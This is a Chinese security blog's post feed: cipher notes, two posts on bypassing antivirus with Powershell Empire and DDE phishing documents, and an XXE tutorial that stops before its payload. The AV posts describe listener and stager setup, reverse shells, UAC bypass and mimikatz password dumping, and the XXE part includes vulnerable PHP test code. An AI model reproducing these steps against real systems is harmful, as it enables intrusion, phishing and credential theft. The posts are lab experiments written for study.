<h2 id="棋盘密码"><a href="#棋盘密码" class="headerlink" title="棋盘密码"></a>棋盘密码</h2><p>一种俄罗斯间谍在冷战中使用的VIC密码<br>其依旧有一个矩阵秘钥，但和别的矩阵有所区别。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">   0 1 2 3 4 5 6 7 8 9</div><div class="line">   -------------------</div><div class="line">   f k m   c p d   y e</div><div class="line">3: h b i g q r o s a z</div><div class="line">7: l u t j n w v x</div></pre></td></tr></table></figure></p>
<p>第一行是前八个关键字，留下两个空白点。它没有行标签。第二行和第三行标有最上面一行没有得到字母的两个数字，然后填写其余的关键字母。</p>
<h3 id="算法-12"><a href="#算法-12" class="headerlink" title="算法"></a>算法</h3><p>为了加密，最上面一行的一个字母只是简单地用列上的数字来代替。其他行上的字母被它们的行号替换。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">D E F E N  D T  H  E E A  S  T  W  A  L  L  O  F T  H  E C A  S  T  L  E</div><div class="line">6 9 0 9 74 6 72 30 9 9 38 37 72 75 38 70 70 36 0 72 30 9 4 38 37 72 70 9</div></pre></td></tr></table></figure></p>
<p>生成的数字就是最简单的明文，但是为了安全考虑可以和别的加密方式联用，例如生成一个二次加密的数字秘钥进行加法，再将结果通过矩阵转换为字母。</p>
<h2 id="Trifid密码"><a href="#Trifid密码" class="headerlink" title="Trifid密码"></a>Trifid密码</h2><p>一种将替换、转置、分割的密码。初始秘钥被分为三个方块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">秘钥 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ</div><div class="line">                                 </div><div class="line">square 1   square 2   square 3   </div><div class="line">                                 </div><div class="line">  1 2 3      1 2 3      1 2 3    </div><div class="line">1 E P S    1 M . Z    1 F G O    </div><div class="line">2 D U C    2 L K X    2 R I J    </div><div class="line">3 V W Y    3 N B T    3 H A Q</div></pre></td></tr></table></figure></p>
<p>将秘钥填入方块中</p>
<h3 id="算法-13"><a href="#算法-13" class="headerlink" title="算法"></a>算法</h3><p>例如加密：<code>D E F E N D T H E E A S T W A L L O F T H E C A S T L E .</code>第一步意味着在上面的正方形中定位明文字母，D在方形1，行2，列1中，所以D变成121。以同样的方式，E变成111。如果我们垂直写下每个字母对应的数字，就会变成：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">D E F E N D T H E E A S T W A L L O F T H E C A S T L E .</div><div class="line">1 1 3 1 2 1 2 3 1 1 3 1 2 1 3 2 2 3 3 2 3 1 1 3 1 2 2 1 2</div><div class="line">2 1 1 1 3 2 3 3 1 1 3 1 3 3 3 2 2 1 1 3 3 1 2 3 1 3 2 1 1</div><div class="line">1 1 1 1 1 1 3 1 1 1 2 3 3 2 2 1 1 3 1 3 1 1 3 2 3 3 1 1 2</div></pre></td></tr></table></figure></p>
<p>然后将这些密文数字进行分割，分割的组数一般是5-20自由选择，这里是每五个为一组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">DEFEN DTHEE ASTWA LLOFT HECAS TLE。</div><div class="line">11312 12311 31213 22332 31131 2212</div><div class="line">21113 23311 31333 22113 31231 3211</div><div class="line">11111 13111 23322 11313 11323 3112</div></pre></td></tr></table></figure></p>
<p>然后按列读取<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">113122111311111 123112331113111 312133133323322 223322211311313 </div><div class="line">S  U  E  F  E   C  P  H  S  E   G  Y  Y  J  I   X  I  M  F  O  </div><div class="line"></div><div class="line">311313123111323 221232113112</div><div class="line">F  O  C  E  J   L  B  S  P</div></pre></td></tr></table></figure></p>
<p>生成的英文即为密文</p>
<h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><p>一种和线性代数矩阵关联的密码。这里就不描述具体过程了。是一种比较接近现代算法的加密方式。详情看文章<a href="http://www.jiamisoft.com/blog/20506-hillcipher.html" target="_blank" rel="external">传送门</a></p>
<h2 id="分馏摩尔斯密码"><a href="#分馏摩尔斯密码" class="headerlink" title="分馏摩尔斯密码"></a>分馏摩尔斯密码</h2><p>一种摩尔斯电码的变种，有篇文章总结得很好<a href="http://www.cromulentrambling.com/2015/02/a-look-at-second-feynman-cipher.html" target="_blank" rel="external">传送门</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> 古典密码 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一次杀软绕过（二）]]></title>
      <url>/2017/11/02/%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC/</url>
      <content type="html"><![CDATA[<h1 id="模拟钓鱼攻击引发的思考"><a href="#模拟钓鱼攻击引发的思考" class="headerlink" title="模拟钓鱼攻击引发的思考"></a>模拟钓鱼攻击引发的思考</h1><p><img src="http://ourd90bac.bkt.clouddn.com/fish.jpg" alt=""></p>
<p>###1. 前言</p>
<p>在上一篇文章“Powershell Empire绕过AV实现远控”中介绍了以powershell作为攻击平台的empire利用前些天曝光的office无宏命令漏洞进行钓鱼攻击，绕过杀软对目标靶机进行远控的例子。事后在继续对实验中恶意代码绕过方式进行进一步思考时有了一点新的理解，接下来将在文章中写明。此篇文章依旧围绕着powershell与杀软的猫捉老鼠的故事进行。</p>
<a id="more"></a>
<h3 id="2-背景介绍"><a href="#2-背景介绍" class="headerlink" title="2. 背景介绍"></a>2. 背景介绍</h3><p><strong>从cmd到powershell</strong><br>学计算机的都应该听说过DOS。dos与cmd很简单又很容易搞混的两个东西。通俗的来讲，dos本来就是一个操作系统，而cmd就只是个应用程序，它是dos的一个实现而已。cmd能实现的命令dos也可以，但是dos能实现的未必在cmd上能实现。作为一直专注于GUI操作系统开发的微软来说，cmd显得并不是那么重要。但是在服务器中一种好的shell是一个能提升管理人员效率的好东西。举例来讲，如果我们要在win系列计算机中创建一个账户，只需要点击鼠标，然后输入账户就可以轻松花费五分钟创建一个新账户，但是要是创建更多的账户，或者更多复杂的操作。系统管理员所要花费的时间就会更长，人性化的GUI操作系统，遇到了瓶颈。尽管微软尝试着用VBScript来配合着弥补这样的缺陷，但是仍旧不能完美地解决这个问题。在这样的背景下，powershell应运而生。关于powershell我就不多赘言，但你要理解它其实为一门脚本语言。</p>
<h3 id="3-杀软与非PE文件"><a href="#3-杀软与非PE文件" class="headerlink" title="3. 杀软与非PE文件"></a>3. 杀软与非PE文件</h3><h4 id="3-1-什么是非PE文件？"><a href="#3-1-什么是非PE文件？" class="headerlink" title="3.1 什么是非PE文件？"></a>3.1 什么是非PE文件？</h4><p>有非PE文件，肯定是有PE文件。什么是PE（Portable Executable）呢？PE文件是一种windows系统 下的可执行文件，具体的文件类型有<code>exe</code>、<code>dll</code>、<code>ocx</code>、<code>sys</code>、<code>com</code>，这些都属于传统的PE文件。win系统可以直接或者间接执行。<br>现在看看非PE文件，其主要分三大类：</p>
<ol>
<li>脚本类。其有包括系统自带和非系统自带。系统自带包括bat、vbs、jscript以及后来加入的powershell。非系统自带包括我们熟知的python、php、java。</li>
<li>文档类。包括我们熟知的office三剑客，word,excel,ppt和另外一个pdf。这四个使我们使用率极高的文档。</li>
<li>其他。包括swf,lnk等类型的文件。</li>
</ol>
<p>####3.2  杀软的查杀策略<br>上述的PE文件在我们平时的使用率最高的文件，自然杀软在进行恶意文件的查杀方面重点就在PE文件上。上一篇文章中我已经介绍过用exe格式的木马进行测试，杀软不负众望，一个不漏的地对其进行了木马隔离。我们可能听过可以dll注入进行反弹shell,但是作为PE文件，dll恶意文件的效果如何呢？这里我们试验下。<br>和往常一样，生成一个恶意的payload1.dll文件。然后放入有杀软的主机。然后在写一个payload1.bat的文件，内容如下：<br><img src="http://ourd90bac.bkt.clouddn.com/2.jpg" alt=""><br>此文件的目的就是让系统调用rundll.exe这个程序执行我们的恶意payload1.dll文件，从而达到反弹shell的目的。但是如何让受害者在毫无戒心的情况下执行bat文件呢？我这里使用了rar可生成<em>自解压</em>压缩包的功能，并且将bat文件设为自动执行，这样就可以让受害者在点击压缩包的一瞬间执行我们的恶意dll文件<br><img src="http://ourd90bac.bkt.clouddn.com/3.jpg" alt=""><br>最后生成自解压压缩包。如图：<br><img src="http://ourd90bac.bkt.clouddn.com/4.jpg" alt=""></p>
<p>我本以为这样就可以巧妙地绕过杀软和用户，但是并不是。这个压缩包在生成后不久就被杀软查杀。这种方法显然不行，也证明杀软在PE文件内容上的检测已经是很强并且可靠的。那么对于非PE文件呢？</p>
<h4 id="3-3-杀软与非PE文件"><a href="#3-3-杀软与非PE文件" class="headerlink" title="3.3 杀软与非PE文件"></a>3.3 杀软与非PE文件</h4><p>一样的，我们先生成一个含有恶意powershell代码的bat文件试一试。<br><img src="http://ourd90bac.bkt.clouddn.com/bat-1.jpg" alt=""><br>以文本方式打开，我们可以看到base64编码的恶意代码，然后将其拖入目标机。这时杀软报毒了<br><img src="http://ourd90bac.bkt.clouddn.com/bat2.jpg" alt=""></p>
<p>看来对于非PE文件的内容检测也是很严格的。</p>
<p>但是我们再来回顾下无宏office命令执行漏洞的恶意代码，也许我们有新的发现<br><img src="http://ourd90bac.bkt.clouddn.com/ok.jpg" alt=""></p>
<p>在我看来，这段恶意利用代码其实可以拆分成两个区域：一是office的DDE协议漏洞的区域，它的主要功能是从word直接调用cmd.exe。二是后面的powershell正常的命令区，这个区域属于psl的正常语法，是psl解释器要解释的东西。而我们真正的恶意代码却在世界的另一端—-网站上。所以其能绕过杀软的检测，成功反弹shell。那既然这样，我们是不是可以举一反三？</p>
<p>于是，我们将psl区的代码写入一个bat文件中，然后直接双击执行。注意，这个bat文件并没有耳音代码，只有恶意的链接。你猜结果会怎样？<br><img src="http://ourd90bac.bkt.clouddn.com/789456.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/sucess.jpg" alt=""><br>成功侦听，最后故技重施。</p>
<h3 id="4-一点点小建议"><a href="#4-一点点小建议" class="headerlink" title="4. 一点点小建议"></a>4. 一点点小建议</h3><p>通过实验可以看出，我们的杀软已经很强悍了，对于恶意代码基本上都可以识别出来，但是对于这种恶意钓鱼链接依旧不敏感。如果以后杀软可以对于钓鱼链接能够很好识别，那就更棒了。</p>
]]></content>
      
        
        <tags>
            
            <tag> 杀软 </tag>
            
            <tag> 病毒 </tag>
            
            <tag> powershell </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一次杀软绕过（一）]]></title>
      <url>/2017/11/02/%E4%B8%80%E6%AC%A1%E6%9D%80%E8%BD%AF%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<h1 id="Powershell-Empire-绕过AV实现远控"><a href="#Powershell-Empire-绕过AV实现远控" class="headerlink" title="Powershell Empire 绕过AV实现远控"></a>Powershell Empire 绕过AV实现远控</h1><p><img src="http://ourd90bac.bkt.clouddn.com/powershell.jpg" alt=""></p>
<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>谁都喜欢框架。无论对于是平时出于各种目的游走在网页和服务器中的黑客，还是从事网络安全测试的安全人员来说，一个好的漏洞框架发挥的作用不言而喻。这其中的<code>Metasploit</code>脱颖而出。虽然这款框架集成了从漏洞发现到漏洞利用的几乎所有功能，但是不得不承认其在木马后门的免杀方面现如今已经不足以应付一些流氓杀软了。但是，<code>Powershell Empire</code>可以。本篇文章是笔者在一次偶然的机会中接触到<code>powershell empire</code>后进行简单初步的摸索，由于关于这款工具的文章很少，大部分都没有涉及到里面模块作用和原理，官方文档能提供的信息也不多。所以我也是尽力把自己理解的写出来，笔者能力有限，更深层次的利用和原理剖析还在逐步进行。请谅解。</p>
<a id="more"></a>
<h2 id="2-为什么是Powershell"><a href="#2-为什么是Powershell" class="headerlink" title="2. 为什么是Powershell?"></a>2. 为什么是Powershell?</h2><p><code>empire</code>选择了<code>poweeshell</code>作为攻击平台总是有原因的。其作为windows平台下的一种命令行外壳程序和脚本环境，它可以使命令行用户和脚本编写者利用<code>.NET Farmework</code>。<br>说到这里，你可能还是一脸懵逼，我也是，毕竟这只是<code>powershell</code>的官方解释。那我们来看下empire开发者是怎么讲的：<a href="http://www.exploit-monday.com/2012/08/Why-I-Choose-PowerShell.html" target="_blank" rel="external">传送门</a>。其中重要的一段是：”<code>Scripting languages offer an advantage to an attacker because they provide a layer of abstraction that AV has no idea how to interpret. For example, a common AV bypass technique is to package malicious Python scripts into an executable. AV has a hard time distinguishing the resulting binary as malicious or legitimate because the Python interpreter itself has plenty of legitimate uses. PowerShell offers a distinct advantage in this scenario due to its tight integration with the Windows OS and considering it’s based upon the .NET framework. With such a powerful scripting environment, there is no need to drop files on disk. Everything, with the possible exception of the script itself run entirely memory-resident.</code>“</p>
<blockquote>
<p>大致意思是：脚本语言为攻击者提供了一个优势，因为它们提供了一个抽象层，杀软（AV）不知道如何解释。例如，常见的杀软旁路技术是将恶意Python脚本打包成可执行文件。杀软很难将生成的二进制文件区分为恶意的或合法的，因为Python解释器本身有很多合法用途。PowerShell在这种情况下提供了明显的优势，因为它与Windows操作系统的紧密集成，并考虑到它基于.NET框架。使用如此强大的脚本环境，不需要将文件放在磁盘上。所有的东西，除了脚本本身的可能例外，它完全是内存驻留的。</p>
</blockquote>
<p><code>no need to drop files on disk</code>:无需写入硬盘，内存驻留。<code>empire</code>使攻击者能在内存中运行命令，也就是empire使用powershell作为攻击平台，并且有<strong>大概率</strong>成功绕过AV的原因。</p>
<blockquote>
<p>这种内存中运行的命令是否会让后来的入侵取证出现困难？这个我还未咨询相关的大佬和老师，暂时就不得而知了。</p>
</blockquote>
<p>##3.  初识Empire<br>和<code>Metasploit</code>一样，<code>empire</code>集成了对主机控制提权，内网主机探测等主流的渗透测试功能。</p>
<p>其重要的由四大部分：<code>listeners</code>（侦听器）、<code>stagers</code>（驿站）、<code>agents</code>（会话代理）、<code>modules</code>（模块）</p>
<ul>
<li><code>listeners</code>相当于msf中的监听模块，用来设置本地IP进行会话监听的。</li>
<li><code>stargers</code>就是一段恶意代码，它通过本机的会话代理（agent）实现本机与被攻击主机的会话通道。</li>
<li><code>agents</code>相当于msf中的<code>session</code>，当我们在被攻击主机上成功执行恶意代码（即木马后门） 时，会反弹一个shell，并通过agent构建本地和被害主机会话。</li>
<li><code>modules</code>这是一个我们在控制了目标主机后，对目标内网或域进行渗透所要使用的主要模块，其包含了很多功能，具体的笔者还在摸索中。</li>
</ul>
<p>###3.1  配置侦听器（Listener）<br>使用<code>listeners</code>命令，加载当前活动的侦听器。没有的话也会提示你。你可以输入<code>help</code>查看帮助，选择Listeners下可以使用的命令。这里我们首先创建一个活动的侦听器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners) &gt; uselistener</div></pre></td></tr></table></figure></p>
<p><code>TAB</code>键弹出可用的侦听建立途径<br><img src="http://ourd90bac.bkt.clouddn.com/begin.jpg" alt=""><br>从图中可以看出具体有七种侦听途径建立方式，其中有五种是通过<code>http</code>协议进行建立通信的，他们之间具体的差别主要在于目标主机的第三方软件配置的差别，关于这一点，<code>empire</code>的官方文档给出了解释：<a href="http://www.powershellempire.com/?page_id=102" target="_blank" rel="external">传送门</a>。剩下的是我们熟悉的msf中常用的<code>meterpreter</code>以及使用条件需要目标主机安装第三方软件<code>dropbox</code>的dbx途径。这里我们选择比较通用的<code>http</code>通道。使用info查看详细配置信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners) &gt; uselistener http</div><div class="line">(Empire: listeners/http) &gt; info</div></pre></td></tr></table></figure>
<p>然后进行配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host 192.168.1.144</div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Port 1234</div></pre></td></tr></table></figure></p>
<p>然后execute生成侦听<br><img src="http://ourd90bac.bkt.clouddn.com/1.jpg" alt=""><br>然后main指令回到主菜单，可以看到一个侦听已经激活。listener列表显示详细信息。<br><img src="http://ourd90bac.bkt.clouddn.com/listen_ok.jpg" alt=""></p>
<h3 id="3-1-配置Stagers"><a href="#3-1-配置Stagers" class="headerlink" title="3.1 配置Stagers"></a>3.1 配置Stagers</h3><p>配置好侦听后就要配置我们的攻击代码了，也就是木马后门。使用<code>usestager</code>命令<code>TAB</code>键可以看到所有根据不同系统的生成木马后门的文件类型。<br><img src="http://ourd90bac.bkt.clouddn.com/stager1.jpg" alt=""><br>其中<code>multi</code>为通用模块、<code>osx</code>mac操作系统、另外还有<code>linux</code>与<code>windows</code>模块。<br>生成的文件类型有<code>.dll</code>,<code>bat</code>，<code>vbs</code>等等。其中就包括前段时间office宏命令漏洞的主角<code>windos/macro</code>模块。详情点击：<a href="http://bobao.360.cn/learning/detail/3605.html" target="_blank" rel="external">传送门</a>。</p>
<p>实战中直接命令<code>usestager [具体模块]</code>就可以在<code>/tmp</code>目录下生成一个特定文件格式的木马后门，然后通过webshell上传运行就可以了。这里因为演示需要就不进行具体文件生成，直接使用<code>launcher</code>+语言类型（这里是powershell）+侦听的名字（这里是侦听的默认名字是http，也可以在设置侦听时自己更改），如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire) &gt; launcher powershell http</div></pre></td></tr></table></figure></p>
<p>生成一个powershell语言的内容,直接在powershell目录下执行就行了:<br><img src="http://ourd90bac.bkt.clouddn.com/begin_poershell.jpg" alt=""></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ps3.jpg" alt=""><br>运行，发现杀软并没有有明显变化，但也并不能证明其免杀效果，因为不清楚杀软是否对powershell的行为流量进行监控。</p>
<h4 id="3-1-1-由此衍生的骚操作"><a href="#3-1-1-由此衍生的骚操作" class="headerlink" title="3.1.1 由此衍生的骚操作"></a>3.1.1 由此衍生的骚操作</h4><p>从上面这里我们可以看到执行恶意的 powershell命令时杀软并没有给出任何报毒反映，那么我们在此基础上进一步将这个利用点扩大化，进行一次模拟网络钓鱼。如何实现？这里我们就要用到最近才出现的office<code>无宏命令执行漏洞</code>了。前几天国内已经有人翻译了原文：<a href="http://bobao.360.cn/learning/detail/4526.html" target="_blank" rel="external">传送门</a>。这个office漏洞的原理简单的说就是，在office中可以通过一种存在于windows内部程序进行数据动态交换的<code>DDE</code>协议进行命令执行，从而达到调用windows内其他程序的目的。看到这里，你应该有点想法了。没错，我们就是用这个命令执行的漏洞，执行我们前面的<code>powershell恶意命令</code>,看会不会有我们想要的那种效果。</p>
<ol>
<li>先将上面生成的攻击代码写成psl文本，放入本地lamp环境根目录：<br><img src="http://ourd90bac.bkt.clouddn.com/apache.jpg" alt=""></li>
<li>编写钓鱼的word文档：<br><img src="http://ourd90bac.bkt.clouddn.com/ps.jpg" alt=""></li>
<li>先用 杀软扫下有没有报毒，再发送至虚拟机。这里因为虚拟机的win7没有word，我就暂时以我的物理机来实验吧（拼了）<br>结果杀软未报毒<br>最终，反弹了自己物理机的shell…………..<br><img src="http://ourd90bac.bkt.clouddn.com/myself.jpg" alt=""></li>
</ol>
<p>再此过程中杀软除了powershell启动的一瞬间给了一次见惯不怪的警告（原来警告确实重要！），之后的会话一直没结束。成功验证操作。</p>
<p>言归正传，此时，<code>empire</code>的agent已有反应，远控回话已开启。此时，我们使用命令<code>interact</code>进入已经建立的会话名。<br><img src="http://ourd90bac.bkt.clouddn.com/in_shell.jpg" alt=""><br>help查看我们在已建立的会话中所能使用的命令，查看目标主机信息。<br><img src="http://ourd90bac.bkt.clouddn.com/system%20info.jpg" alt=""></p>
<p>能成功执行，继续深入，使用<code>mimikatz</code>命令可以查看目标主机的用户名以及密码，但是我么可以看到这里失败了。<br><img src="http://ourd90bac.bkt.clouddn.com/pass1.jpg" alt=""><br>爆出了<code>needs to elevated content</code>的错误，这里大家应该明白需要提权了。那么<code>empire</code>有没类似于msf中的提权命令呢？有的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire PHWC8BT4) &gt;bypassuac [侦听名]</div></pre></td></tr></table></figure></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/pass2.jpg" alt=""><br>就可以进行提权。</p>
<blockquote>
<p>但是如果运气不好也会出现提权不成功的情况。刚刚说过它和msf一样有相应的提权方式，<code>empire</code>中的<code>module</code>模块中含有相应的扫描模块可以在一键命令提权失败的情况下，进行扫描，找出对应的提权方法，这是后话了。虽然它和msf在提权上的成功率上的比较，笔者还没比较过，但应该是有差别的。</p>
</blockquote>
<p>list列出提权后的会话列表，发现多出一个和原来会话主机名相同，但<code>Username</code>前多一个星号的会话，这个带星号的用户就是提权后的高权限用户了。我们现在interact进入这个高权限用户的会话中，查看用户密码。<br><img src="http://ourd90bac.bkt.clouddn.com/password.jpg" alt=""></p>
<p>可以看出，提权后我们可以对目标主机进行更多的操作，可以直接找出目标的用户名和密码的hash，如果用户密码是弱口令的话，甚至可以直接爆出密码明文。接着如果目标主机有其他内网主机的话就可以进一步地“为所欲为”了。</p>
<blockquote>
<p>在控制目标主机后，我们可以将这个会话发送给msf，使用<code>meterpreter</code>进行更多操作。</p>
</blockquote>
<h1 id="4-我们的杀软在做什么"><a href="#4-我们的杀软在做什么" class="headerlink" title="4. 我们的杀软在做什么"></a>4. 我们的杀软在做什么</h1><p>首先实验一开始，我们使用了恶意的powershell的命令进行攻击。杀软并没有进行报错，毫无反应，证明杀软暂时对Powershell的执行并没有多少设防，但此时我们的攻击端也未进入agent会话，因为不懂杀软是怎样基于行为进行查杀的，所以我们暂时不能说明它不可以拦截恶意行为。<br>而后，攻击端interact连接进会话，攻击机和目标靶机形成数据交互，而且是我们通过http通道建立的。我们再看看目标靶机，依旧毫无反应，这其实很奇怪了，现在的杀软既然已经开始对于电脑中的可以行为进行检测，特别是这种很有疑点的外部通讯，应该是重点查杀的对象，但这里杀软并没有给出任何反应。难道是因为我们的侦听模块是使用的http通道？大胆猜测下，应该是的。<br>接下来的操作目标靶机的杀软都没有反应。到了提权的那一步我就开始使用杀软进行主动扫描，按照杀软的描述，其对磁盘和内存进程都会扫描。但是结果提醒我是安全的。</p>
<p>一片绿色，完全没有问题。就和我们前面的钓鱼一样，木马后门如入无人之境。<br>为了体现这种powershell马的特点和优势，我有生成了几个msf下典型的木马，其中包括未经过编码处理的木马，经过<code>encode</code>十多次的木马和加壳木马，无一例外被杀软查杀，只是后两种有概率在种入木马时运行前不会报毒，但是在运行时，无一例外均被杀。甚至加壳的马会直接被我物理机上的杀软查出。</p>
<h1 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h1><p><code>empire</code>虽然已经比较强大了，但是使用工具的意义并不是它能给我们带来的效益和那种快感，其真正意义在于研究其背后所利用的漏洞原理。这里利用powershell进行攻击，并建立有效的攻击机与目标机的连接，最吸引人的是原始开发者的思路，这才是<code>empire</code>带给我最大的收获。顺着这个思路似乎已经有其他发现了。</p>
<blockquote>
<p>该文写于10月中旬，此漏洞利用过程杀软现已具备查杀功能。该文已同过360安全客平台发表,<a href="http://m.bobao.360.cn/learning/appdetail/4643.html" target="_blank" rel="external">http://m.bobao.360.cn/learning/appdetail/4643.html</a></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> 杀软 </tag>
            
            <tag> 病毒 </tag>
            
            <tag> powershell </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XML实体注入]]></title>
      <url>/2017/10/19/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h1><p><img src="http://ourd90bac.bkt.clouddn.com/XML.jpg" alt=""></p>
<blockquote>
<p>感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。<br><a id="more"></a></p>
<p>##1. 基础引入</p>
</blockquote>
<h3 id="1-1什么是XML？"><a href="#1-1什么是XML？" class="headerlink" title="1.1什么是XML？"></a>1.1什么是XML？</h3><p>XML是一种可扩展标记语言（英语：Extensible Markup Language，简称：XML），是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML。被设计用来传输和存储数据。</p>
<h3 id="1-2基础语法"><a href="#1-2基础语法" class="headerlink" title="1.2基础语法"></a>1.2基础语法</h3><p>和HTML一样作为一种标记语言，XML也具有传统标记语言的特色。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>C1em0<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>XML-inject<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面的代码中可以看到出，xml语言有着我们熟悉的标签。在第一行是xml的版本和编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是根的子元素。</from></to></note></p>
<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
<h3 id="1-3XML实体"><a href="#1-3XML实体" class="headerlink" title="1.3XML实体"></a>1.3XML实体</h3><p>实体作为XML中五种简单模块中的一种，    因其用于定义与引用普通文本或者特殊字符，且实体可在内部和外部声明，所以利用其引用的特点就可以构造payload进行攻击。</p>
<h2 id="2-文档定义类型DTD"><a href="#2-文档定义类型DTD" class="headerlink" title="2.文档定义类型DTD"></a>2.文档定义类型DTD</h2><p>DTD的作用是定义XML文档的合法构建模块。利用DTD来内部或外部引入实体。</p>
<p>它的基本格式为：<code>&lt;!DOCTYPE 根元素名 [元素的描述]&gt;</code></p>
<h3 id="2-1内部引入"><a href="#2-1内部引入" class="headerlink" title="2.1内部引入"></a>2.1内部引入</h3><p>首先确定格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
<p>现在我们将DTD与XML放在同一个文档中，即构成了实体的内部引入：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span>  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  C1em0  "This is an internally introduced entity"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;C1em0;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>直接访问该文档，&amp;C1em0就会被解析为“This is an internally introduced entity”并输出。</p>
<h3 id="2-2外部引入"><a href="#2-2外部引入" class="headerlink" title="2.2外部引入"></a>2.2外部引入</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
<p>其与内部引入只是多了<code>system</code>与目标的<code>uri</code>，也就是目录。讲到这里应该可以知道xml实体注入攻击的主要目的是进行对目标的目录内容读取，目录遍历。其实也可以利用外部引入进行SSRF攻击。</p>
<p>##3. 应用</p>
<p>###3.1 一般的XXE攻击</p>
<p>测试代码为test.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">	 print_r((string)$xml);</div></pre></td></tr></table></figure></p>
<blockquote>
<p>这里的<code>simplexml_load_string</code>是将xml文本生成一个对象。</p>
</blockquote>
<p>上面说过，xxe攻击的形式一般是读取源码，所以这里就要一些读取文件的协议，最常用的就是<code>file</code>协议。</p>
<p>现在在windows环境下读取c盘下的target.txt文件，payload:</p>
